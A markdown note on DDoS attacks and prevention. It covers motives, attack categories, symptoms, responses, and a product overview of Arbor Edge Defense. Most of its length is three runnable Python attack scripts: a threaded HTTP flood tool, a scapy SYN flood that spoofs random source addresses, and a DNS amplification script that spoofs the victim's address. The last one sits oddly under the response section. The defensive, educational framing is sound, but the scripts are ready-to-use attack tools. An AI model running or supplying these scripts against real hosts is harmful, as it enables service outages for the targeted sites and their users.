# DDoS Prevention

## Table of contents

- [DDoS Prevention](#ddos-prevention)
  - [Table of contents](#table-of-contents)
  - [Reasons](#reasons)
  - [Types](#types)
    - [Application layer attacks](#application-layer-attacks)
    - [Protocol attacks](#protocol-attacks)
    - [Volumetric attacks](#volumetric-attacks)
    - [Multi-vector attacks](#multi-vector-attacks)
  - [Usual DDoS symptoms](#usual-ddos-symptoms)
  - [Responding to a DDoS attack](#responding-to-a-ddos-attack)
  - [How to prevent](#how-to-prevent)
  - [DDoS protection platform - Arbor Edge Defense (AED)](#ddos-protection-platform---arbor-edge-defense-aed)
    - [Features](#features)
      - [Stateless, On-premise, DDoS Protection](#stateless-on-premise-ddos-protection)
      - [Intelligently Automated, Hybrid DDoS Protection](#intelligently-automated-hybrid-ddos-protection)
      - [Edge Enforcement of Your Threat Intelligence](#edge-enforcement-of-your-threat-intelligence)
      - [Integration with Existing Security Stack and Process](#integration-with-existing-security-stack-and-process)

## Reasons

- `Ransomwares` are usually be demanded after conducting DDoS attacks
- `Hacktivism` is used to voice opinion to support or opposition to a regulation, person, or company
- `Competition` of cyber criminal enterprises, gangs, and syndicates

## Types

### Application layer attacks

- Include: 
  - Slowloris
  - Slow Post
  - Slow Read
  - HTTP(/s) Flooding

 
Such as `HTTP flood attack` in which malicious actors just keep sending various HTTP requests to a server using different IP addresses

![](https://www.onelogin.com/images/patterns/text-image/ddos-app-layer-attack.png)

Sample code to attack with python:

```python
  import random
  import socket
  import string
  import sys
  import threading
  import time

  # Parse inputs
  host = ""
  ip = ""
  port = 0
  num_requests = 0

  if len(sys.argv) == 2:
      port = 80
      num_requests = 100000000
  elif len(sys.argv) == 3:
      port = int(sys.argv[2])
      num_requests = 100000000
  elif len(sys.argv) == 4:
      port = int(sys.argv[2])
      num_requests = int(sys.argv[3])
  else:
      print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
      sys.exit(1)

  # Convert FQDN to IP
  try:
      host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
      ip = socket.gethostbyname(host)
  except socket.gaierror:
      print (" ERROR\n Make sure you entered a correct website")
      sys.exit(2)

  # Create a shared variable for thread counts
  thread_num = 0
  thread_num_mutex = threading.Lock()


  # Print thread status
  def print_status():
      global thread_num
      thread_num_mutex.acquire(True)

      thread_num += 1
      #print the output on the sameline
      sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
      sys.stdout.flush()
      thread_num_mutex.release()


  # Generate URL Path
  def generate_url_path():
      msg = str(string.ascii_letters + string.digits + string.punctuation)
      data = "".join(random.sample(msg, 5))
      return data


  # Perform the request
  def attack():
      print_status()
      url_path = generate_url_path()

      # Create a raw socket
      dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

      try:
          # Open the connection on that raw socket
          dos.connect((ip, port))

          # Send the request according to HTTP spec
          #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
          byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
          dos.send(byt)
      except socket.error:
          print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
      finally:
          # Close our socket gracefully
          dos.shutdown(socket.SHUT_RDWR)
          dos.close()


  print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

  # Spawn a thread per request
  all_threads = []
  for i in range(num_requests):
      t1 = threading.Thread(target=attack)
      t1.start()
      all_threads.append(t1)

      # Adjusting this sleep time will affect requests per second
      time.sleep(0.01)

  for current_thread in all_threads:
      current_thread.join()  # Make the main thread wait for the children threads
```

### Protocol attacks

- Examples: 
  - SYN floods
  - ACK floods
  - ICMP smurfs
  
Such as `SYN flood attack`, the attacker floods the server with numerous SYN packets, each containing spoofed IP addresses. The server responds to each packet (via SYN-ACKs), requesting the client to complete the handshake

![](https://www.onelogin.com/images/patterns/text-image/ddos-protocol-attack.png)

Sample code to attack with python:

```python
  from scapy.all import *
  import os
  import sys
  import random

  def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

  def randInt():
    x = random.randint(1000,9000)
    return x	

  def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    print "Packets are sending"
    for x in range (0,counter):
      s_port = randInt()
      s_eq = randInt()
      w_indow = randInt()

      IP_Packet = IP ()
      IP_Packet.src = randomIP()
      IP_Packet.dst = dstIP

      TCP_Packet = TCP ()	
      TCP_Packet.sport = s_port
      TCP_Packet.dport = dstPort
      TCP_Packet.flags = "S"
      TCP_Packet.seq = s_eq
      TCP_Packet.window = w_indow

      send(IP_Packet/TCP_Packet, verbose=0)
      total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


  def info():
    os.system("clear")
    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return dstIP,int(dstPort)
    

  def main():
    dstIP,dstPort = info()
    counter = input ("How many packets do you want to send : ")
    SYN_Flood(dstIP,dstPort,int(counter))

  main()
```

### Volumetric attacks

- Examples: 
  - UDP floods
  - ICMP floods
  - DNS amplification attacks
  
Such as `DNS amplification attack`, a malicious actor sends requests to a DNS server, using the spoofed IP address of the target. The DNS server then sends its response to the target server. When done at scale, the deluge of DNS responses can wreak havoc on the target server

![](https://www.onelogin.com/images/patterns/text-image/ddos-volumetric-attack.png)

### Multi-vector attacks

Bad actors infiltrate a network using multiple entry points or “vectors.” Common vectors include emails, databases and web browsers. The goal can be to take down a target’s network or to obtain sensitive data  

![](https://i.ibb.co/vq7jPj3/multi-vector-attacks.png)

## Usual DDoS symptoms

- Large amounts of traffic coming from clients with same or similar characteristics
- An exponential, unexpected rise in traffic at a single endpoint/server
- A server starts repeatedly crashing for no reason
- The website is taking too long to respond to requests

## Responding to a DDoS attack

- `Blackhole filtering` makes criterion to route malicious traffic into a blackhole, essentially dropping it
- `Casting` distributes the traffic across multiple servers, increasing your capacity, and decreasing the chances of individual servers getting overwhelmed
- `IP Blocking` blocks unexpectedly high traffic from the same range of IP addresse

```python
  from scapy.all import *
  from argparse import ArgumentParser
  import sys
  import os

  def construct_IP(DNSaddr):
      # Construct IP packet
      ip = IP()
      ip.dst = DNSaddr
      ip.show()
      return ip

  def construct_UDP():
      # Construct UDP packet
      udp = UDP()
      udp.display()
      return udp

  def construct_DNS():
      # Construct DNS packet
      dns = DNS()
      dns.rd = 1
      dns.qdcount = 1
      dns.display()
      return dns

  def construct_DNSQR(qtype=255, qname = 'qq.com'):
      # Construct DNS Question Record
      q = DNSQR()
      q.qtype = qtype
      q.qname = qname
      q.display()
      return q

  def Set_UP(ip, udp, dns, q, target = '127.0.0.1'):
      # Set DNS Question Record in DNS packet
      dns.qd = q

      # Concencate
      r = (ip/udp/dns)
      r.display()
      # SYN scan
      sr1(r)

      # Set up r
      r.src = target
      r = (ip/udp/dns)
      r.display()
      return r

  if __name__ == '__main__':
      parser = ArgumentParser()
      parser.add_argument("-D", "--DNS-server", help="Assign specific DNS server", dest="D")
      parser.add_argument("-T", "--Target", help="target server", dest="T")
      args = parser.parse_args()
      print('DNS server: %s' %args.D)
      print('Target: %s' %args.T)

      ip = construct_IP(DNSaddr = args.D)
      udp = construct_UDP()
      dns = construct_DNS()
      q = construct_DNSQR()

      r = Set_UP(ip, udp, dns, q, args.T)

      a = 'Y'
      a = input('Are you sure you want to attack ? [Y]/N')
      if (a == 'Y'):
          send(r)
      else:
          exit()
```

## How to prevent

- Real-time packet analysis
- DDoS defense system (DDS)
- Web application firewall (WAF)
- Rate limiting

## DDoS protection platform - Arbor Edge Defense (AED)

- Acting as a network edge threat intelligence enforcement point where it blocks in bulk, inbound cyber threats (e.g. DDoS attacks, IOCs) and outbound malicious communication 
- Essentially acting as the first and last line of network perimeter defense for an organization

![](https://www.netscout.com/sites/default/files/2020-02/14/images/Scalable-Fully-Managed-On-Premises-Protection-diagram.png)

### Features

#### Stateless, On-premise, DDoS Protection

- Stop large packets due to its stateless packet processing
- Stop TCP-state exhaustion attacks that target and impact stateful devices such as NGFWs

#### Intelligently Automated, Hybrid DDoS Protection

Automatically route large DDoS attacks to center

#### Edge Enforcement of Your Threat Intelligence

Enforce threat intelligence at the network edge to stop inbound DDoS attacks and outbound communication to known bad sites

#### Integration with Existing Security Stack and Process

Fully integrated component of an organization’s existing security stack and process